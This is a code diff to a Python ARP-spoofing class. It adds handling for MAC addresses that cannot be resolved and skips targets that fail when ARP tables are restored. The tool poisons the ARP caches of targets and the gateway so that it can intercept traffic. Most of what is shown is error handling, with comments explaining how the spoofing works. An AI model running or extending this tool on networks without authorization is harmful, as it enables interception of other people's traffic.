@@ -25,6 +25,7 @@ class ArpSpoof:
         self.gw = ''
         self.verbose = '0'
         self.ips = []
+        self.dropped_ips = []
 
         self.run = True
 
@@ -129,8 +130,9 @@ class ArpSpoof:
 
         for x in range(0, n, 2):
             ip = self.ips[x]
-            if ip != local_ip and ip != self.gw:
-                self.restore(str(ip), self.gw)
+            if ip not in self.dropped_ips:
+                if ip != local_ip and ip != self.gw:
+                    self.restore(str(ip), self.gw)
 
         self.restore(self.gw, str(ip))
 
@@ -144,6 +146,7 @@ class ArpSpoof:
         """
         ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') /
                      ARP(pdst=ip), timeout=3, verbose=0)
+        
         if ans:
             return ans[0][1].src
 
@@ -152,9 +155,6 @@ class ArpSpoof:
         Spoofs `target_ip` saying that we are `host_ip`.
         it is accomplished by changing the ARP cache of the target (poisoning)
         """
-        # get the mac address of the target
-        if target_mac == '':
-            target_mac = self.get_mac(target_ip)
         # craft the arp 'is-at' operation packet, in other words; an ARP response
         # we don't specify 'hwsrc' (source MAC address)
         # because by default, 'hwsrc' is the real MAC address of the sender (ours)
@@ -193,10 +193,17 @@ class ArpSpoof:
     def start_spoof(self, target_ip, gw_ip, target_mac, verbose):
         if verbose > 0:
             # get the real MAC address of target
-            if target_mac == '':
-                target_mac = self.get_mac(target_ip)
+            target_mac = self.get_mac(target_ip)
             # get the real MAC address of spoofed (gateway, i.e router)
             gw_mac = self.get_mac(gw_ip)
+
+            if target_mac == None:
+                print(self.c.RED + '[!] Error getting the target MAC address for IP: %s' % target_ip)
+                self.dropped_ips.append(target_ip)
+                return
+            if gw_mac == None:
+                print(self.c.RED + '[!] Error getting the gateway MAC address for IP: %s' % gw_ip)
+                return
 
             print(self.c.YELLOW + "[+] Start ARP spoof between %s (%s) and %s (%s)" %
                   (target_ip, target_mac, gw_ip, gw_mac))
